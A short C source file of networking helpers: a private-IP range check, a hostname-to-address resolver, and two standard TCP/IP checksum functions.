
#include "Include.h"
#include "Hell.h"

BOOL PrivateIP(const char *ip)
{	
	if (ip) {
		if (strcmp(ip, "") != 0) {
			char *token, ipbuf[32]; 	
			strncpy(ipbuf, ip, sizeof(ipbuf)); 
			if ((token=strtok(ipbuf, ".")) != NULL) { 
				int ip1 = atoi(token);
				if ((token=strtok(NULL, ".")) != NULL) {
					int ip2 = atoi(token);
					
					if (((ip1 == 10)								// Class A Private Network
						|| (ip1 == 172 && ip2 > 15 && ip2 < 32)	    // Class B Private Network
						|| (ip1 == 192 && ip2 == 168))				// Class C Private Network
						|| (ip1 == 90  && ip2 == 0)) 				// Undefined Network Range
						return TRUE;
				}
			}
		}
	}
	return FALSE; 
}

unsigned long ResolveAddress(char *szHost)
{
	unsigned long IP = inet_addr(szHost);
	if (IP==INADDR_NONE) {
		hostent *pHE = gethostbyname(szHost);
		if (pHE == 0) 
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);	
	}
	
	return IP;
}



// Standard TCP/UDP checksum function.
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;
	
    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(USHORT);   
    }
	
    if (size)
        cksum += *(UCHAR*)buffer;   
	
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 
	
    return (USHORT)(~cksum); 
}

unsigned short in_cksum(unsigned short *addr,int len)
{
	register int sum = 0;
	unsigned short answer = 0;
	register unsigned short *w = addr;
	register int nleft = len;
	
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}
	
	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}
	
	sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
	sum += (sum >> 16);                     /* add carry */
	answer = ~sum;                          /* truncate to 16 bits */
	return(answer);
}
